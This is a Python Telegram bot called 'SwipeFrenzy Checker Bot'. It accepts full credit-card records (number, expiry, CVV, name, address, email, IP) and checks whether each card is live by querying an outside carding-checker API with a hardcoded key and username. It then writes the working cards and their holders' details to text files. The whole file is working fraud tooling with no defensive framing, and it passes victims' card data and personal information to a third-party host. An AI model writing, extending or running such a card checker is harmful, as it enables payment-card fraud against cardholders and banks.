import telebot
import requests
import datetime
import random
import os
from telebot import types

# ==================== BOT SETUP ====================
TOKEN = os.getenv("TOKEN")
if not TOKEN:
    TOKEN = input("Enter your Telegram Bot Token: ")

bot = telebot.TeleBot(TOKEN)
user_data = {}

API_KEY = "e243b2046e7cfeef3b9e8c28e9897d87"
USERNAME = "EscoCCs"
BASE_URL = "https://mirror1.luxchecker.vc/apiv2/"
CHECK_TYPE = "avk.php"   # Change to "ck.php" for normal CC check

# ==================== CHECK FUNCTION ====================
def check_card(parts):
    if len(parts) < 11:
        return {"status": "error", "msg": "Invalid format. Use 12 fields separated by |"}

    try:
        cardnum = parts[0].strip()
        expm = parts[1].strip()
        expy = parts[2].strip()
        cvv = parts[3].strip()
        fname = parts[4].strip()
        lname = parts[5].strip()
        address = parts[6].strip()
        city = parts[7].strip()
        state = parts[8].strip()
        zipcode = parts[9].strip()
        country = parts[10].strip()
        gmail = parts[11].strip() if len(parts) > 11 else "N/A"
        ip = parts[12].strip() if len(parts) > 12 else "N/A"

        payload = {
            "cardnum": cardnum, "expm": expm, "expy": expy, "cvv": cvv,
            "fname": fname, "lname": lname, "address": address, "city": city,
            "state": state, "zip": zipcode, "country": country,
            "key": API_KEY, "username": USERNAME
        }

        r = requests.get(BASE_URL + CHECK_TYPE, params=payload, timeout=15)
        response = r.json()

        if response.get("error"):
            return {"status": "error", "msg": response.get("error")}

        if response.get("result") == 1:
            return {
                "status": "live",
                "data": {
                    "card": cardnum,
                    "exp": f"{expm}/{expy}",
                    "cvv": cvv,
                    "name": f"{fname} {lname}",
                    "bank": "Unknown",
                    "country": f"{country} • Mastercard",
                    "address": f"{address}, {city}, {state} {zipcode}",
                    "phone": "N/A",
                    "email": gmail,
                    "ip": ip,
                    "time": datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
                }
            }
        return {"status": "dead"}
        
    except Exception as e:
        return {"status": "error", "msg": str(e)}

def format_live_card(info):
    return f"""
══════════════════════════════════════
👤 Name : {info['name']}
💳 Card : {info['card']}
📅 Expiry : {info['exp']}
🔒 CVV : {info['cvv']}
🏦 Bank : {info['bank']}
🌍 Country : {info['country']}
📍 Billing Address: {info['address']}
📞 Phone : {info['phone']}
✉️ Email : {info['email']}
🌐 IP : {info['ip']}
🕒 Checked : {info['time']}
══════════════════════════════════════
""".strip()

# ==================== COMMANDS ====================
@bot.message_handler(commands=['start'])
def start(message):
    markup = types.ReplyKeyboardMarkup(resize_keyboard=True, row_width=2)
    markup.add('/check', '/tester')
    bot.reply_to(message, "👋 **SwipeFrenzy Checker Bot** Started.\n\nUse the buttons below:", parse_mode='Markdown', reply_markup=markup)

@bot.message_handler(commands=['check'])
def cmd_check(message):
    user_id = message.chat.id
    user_data[user_id] = {"mode": "check", "target": 0, "lives": []}
    bot.reply_to(message, "How many **live cards** do you need?")

@bot.message_handler(commands=['tester'])
def cmd_tester(message):
    user_id = message.chat.id
    user_data[user_id] = {"mode": "tester"}
    bot.reply_to(message, "🧪 **Tester Mode Activated**\n\nSend one full card at a time. I will keep asking until I get a **LIVE** one.")

# ==================== MAIN HANDLER ====================
@bot.message_handler(func=lambda m: True)
def handle_all(message):
    user_id = message.chat.id
    text = message.text.strip()

    if user_id not in user_data:
        bot.reply_to(message, "Please use /start first.")
        return

    data = user_data[user_id]

    # Setting Target
    if data["mode"] == "check" and data["target"] == 0:
        try:
            data["target"] = int(text)
            bot.reply_to(message, f"✅ Target set to **{data['target']}** live cards.\n\nNow send cards in this format:\n`card|month|year|cvv|fname|lname|address|city|state|zip|country|email|ip`", parse_mode='Markdown')
            return
        except:
            bot.reply_to(message, "❌ Please send a valid number.")
            return

    # Process Card
    parts = [x.strip() for x in text.split("|")]
    result = check_card(parts)

    if result["status"] == "error":
        bot.reply_to(message, f"❌ Error: {result.get('msg')}")
        return

    if data["mode"] == "tester":
        if result["status"] == "live":
            filename = f"tester{random.randint(1000,9999)}.txt"
            with open(filename, "w", encoding="utf-8") as f:
                f.write(format_live_card(result["data"]))
            bot.reply_to(message, f"✅ **LIVE FOUND!**\nSaved as: `{filename}`", parse_mode='Markdown')
            del user_data[user_id]
        else:
            bot.reply_to(message, "❌ Dead. Send another card.")

    elif data["mode"] == "check":
        if result["status"] == "live":
            data["lives"].append(result["data"])
            bot.reply_to(message, f"✅ **LIVE** ({len(data['lives'])}/{data['target']})")
        else:
            bot.reply_to(message, "❌ Dead")

        if len(data["lives"]) >= data["target"]:
            with open("lives.txt", "a", encoding="utf-8") as f:
                for card in data["lives"]:
                    f.write(format_live_card(card) + "\n\n")
            bot.reply_to(message, f"🎯 Target completed! Saved to `lives.txt`", parse_mode='Markdown')
            del user_data[user_id]

print("🚀 SwipeFrenzy Bot is Running...")
bot.infinity_polling()
